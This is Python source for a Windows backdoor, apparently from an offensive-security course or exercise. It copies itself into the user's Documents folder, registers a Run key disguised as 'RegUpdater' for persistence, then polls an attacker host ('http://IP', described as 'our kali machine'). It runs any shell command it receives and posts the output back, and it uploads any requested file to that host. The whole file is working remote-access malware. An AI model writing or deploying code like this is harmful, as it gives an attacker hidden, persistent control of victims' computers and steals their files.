
import os
import shutil
import subprocess
import _winreg as wreg

import requests 
import time




path = os.getcwd().strip('/n')  
Null,userprof = subprocess.check_output('set USERPROFILE', shell=True).split('=')
destination = userprof.strip('\n\r') + '\\Documents\\'  +'persistence.exe'



#If it was the first time our backdoor gets executed, then Do phase 1 and phase 2 

if not os.path.exists(destination):  

    shutil.copyfile(path+'\persistence.exe', destination)#You can replace   path+'\persistence.exe'  with  sys.argv[0] , the sys.argv[0] will return the file name
                                                         # and we will get the same result
    key = wreg.OpenKey(wreg.HKEY_CURRENT_USER, "Software\Microsoft\Windows\CurrentVersion\Run",0,
                         wreg.KEY_ALL_ACCESS)
    wreg.SetValueEx(key, 'RegUpdater', 0, wreg.REG_SZ,destination)
    key.Close()


#Last phase is to start a reverse connection back to our kali machine

while True: 

    req = requests.get('http://IP')
    command = req.text
        
    if 'terminate' in command:
        break 

    elif 'grab' in command:
        
        grab,path=command.split('*')
        if os.path.exists(path):
            url = 'http://IP/store'
            files = {'file': open(path, 'rb')}
            r = requests.post(url, files=files)
        else:
            post_response = requests.post(url='http://IP', data=
                                          '[-] Not able to find the file !' )
            
    else:
        CMD =  subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        post_response = requests.post(url='http://IP', data=CMD.stdout.read() )
        post_response = requests.post(url='http://IP', data=CMD.stderr.read() )

    time.sleep(3)












